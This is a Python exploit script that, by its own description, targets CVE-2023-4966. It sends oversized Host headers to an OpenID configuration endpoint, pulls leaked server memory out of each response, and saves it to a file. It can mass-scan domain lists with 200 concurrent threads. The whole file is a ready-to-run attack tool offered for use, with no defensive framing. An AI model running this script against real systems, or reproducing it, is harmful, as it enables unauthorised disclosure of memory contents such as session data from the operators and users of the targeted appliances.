import requests 
from colorama import Fore ,  Style , Back
import concurrent.futures
import random
import argparse
import os 
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

red =  Fore.RED

green = Fore.GREEN

magenta = Fore.MAGENTA

cyan = Fore.CYAN

mixed = Fore.RED + Fore.BLUE

blue = Fore.BLUE

yellow = Fore.YELLOW

white = Fore.WHITE

reset = Style.RESET_ALL

bold = Style.BRIGHT

target_list = []

colors = [ green, cyan, blue]

random_color = random.choice(colors)

HEADERS = {
        "Host": "a"*24576
    }


banner = f"""{bold}{random_color}

    ______     ____  __         _ ______         
   / ____/  __/ __ \/ /  ____  (_)_  __/__  _____
  / __/ | |/_/ /_/ / /  / __ \/ / / / / _ \/ ___/
 / /____>  </ ____/ /__/ /_/ / / / / /  __/ /    
/_____/_/|_/_/   /_____|____/_/ /_/  \___/_/     
                                                   
                                              
                                              
                            Author: D.SanjaiKumar @CrackSoftSecurities
                                               

{reset}"""



requests.packages.urllib3.disable_warnings()

parser =  argparse.ArgumentParser(description=f"[{bold}{green}DESCRIPTON{reset}]: {bold}{white}Exploit script for CVE-2023-4966{reset}")

parser.add_argument("-d", "--domain", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol eg:(www.domain.com){reset}")

parser.add_argument("-dL", "--domains-list", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol eg:(www.domain.com){reset}")

parser.add_argument("-o", '--output', help=f"[{bold}{blue}INFO{reset}]: {bold}{white}File name to save output")

args =  parser.parse_args()



def exploit_me(url):
    
    try:
        url = url 
        
        response = requests.get(f"http://{url}/oauth/idp/.well-known/openid-configuration", verify=False, timeout=15, headers=HEADERS)
        
        if response.status_code == 200 :
            
            #print(response.text)
            
            memory_data = response.text[131050:]
            
            print(f"{bold}{white}-------------------------------------------Dumped Memory ---------------------------------------------------------------{reset}\n")
            
            print(f"[{bold}{blue}INFO{reset}]: Dumped memory for this target: {url}\n")
            
            print(f"[{bold}{blue}{memory_data}{reset}]\n")
            
            print(f"{bold}{white}-------------------------------------------END--------------------------------------------------------------------------{reset}\n")
            
            save(url, memory_data)
            
        else:
            
            print(f"[{bold}{red}FAILED{reset}]: Cannot Dump memory for this target: {url}\n")
            
            print(f"{bold}{white}--------------------------------------Cannot Dump Memory ---------------------------------------------------------------{reset}\n")
            
    except TimeoutError as e:
        
        pass
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold}CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass



def exploit(url) :

    try:
        url = url 
        
        response = requests.get(f"https://{url}/oauth/idp/.well-known/openid-configuration", verify=False, timeout=15, headers=HEADERS)
        
        if response.status_code == 200 :
            
            memory_data = response.text[131050:]
            
            
            print(f"{bold}{white}-------------------------------------------Dumped Memory ---------------------------------------------------------------{reset}\n")
            
            print(f"[{bold}{blue}INFO{reset}]: Dumped memory for this target: {url}\n")
            
            print(f"[{bold}{blue}{memory_data}{reset}]\n")
            
            print(f"{bold}{white}-------------------------------------------END--------------------------------------------------------------------------{reset}\n")
            
            save(url, memory_data)
            
        else:
            
            print(f"[{bold}{red}FAILED{reset}]: Cannot Dump memory for this target: {url}\n")
            
            print(f"{bold}{white}--------------------------------------Cannot Dump Memory ---------------------------------------------------------------{reset}\n")
            
    except TimeoutError as e:
        
        exploit_me(url)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold}CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        exploit_me(url)
    
        
        
def speed(subdomains):
    
    try:
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            
            futures = [executor.submit(exploit, url)for url in subdomains]
            
        concurrent.futures.wait(futures)
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold}CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
        
        
        
def save(url,  body):
    
    try:
    
        if args.output:
            
            if os.path.isfile(args.output):
                
                filename = args.output
                
            elif os.path.isdir(args.output):
                
                filename = os.path.join(args.output, f"exploitation_results.txt")
                
            else:
                
                filename = args.output
                
        if not args.output:
            
            filename = f"exploitation_results.txt"
            
        
        with open(filename, "a") as w:
            
            w.write(f"{url} ------> [{body}]"+ '\n')
            
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold}CTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
        
def main():
    
    print(banner)
    
    if args.domain:
        
        url =  args.domain 
        
        target_list.append(url)
        
        
        
        speed(target_list)
        
    if args.domains_list:
        
        try:
            
            filename= args.domains_list
            
            with open(filename, "r") as url:
                
                urls = url.read().split()
                
            for url in urls:
                
                target_list.append(url)
                
            speed(target_list)

            
            for url in target_list:
                
                exploit(url)
            
        except FileNotFoundError as e:
            
            print(f"[{bold}{red}ALERT{reset}]: File not Found please check the file exits or not")
            
            exit()
            
        except KeyboardInterrupt as e:
        
            print(f"{bold}{bold}CTRL+C Pressed{reset}")
        
            exit()
        
        except Exception as e:
        
            print(f"[{bold}{red}FAILED{reset}]: Error occured due to: {e}")
            
    if not args.domain and not args.domains_list:
        
        print(f"[{bold}{blue}INFO{reset}]: Please provide a domain or domains list for exploit")
        
if __name__ == "__main__" :
    
    main()
            
        
        
        
            
            
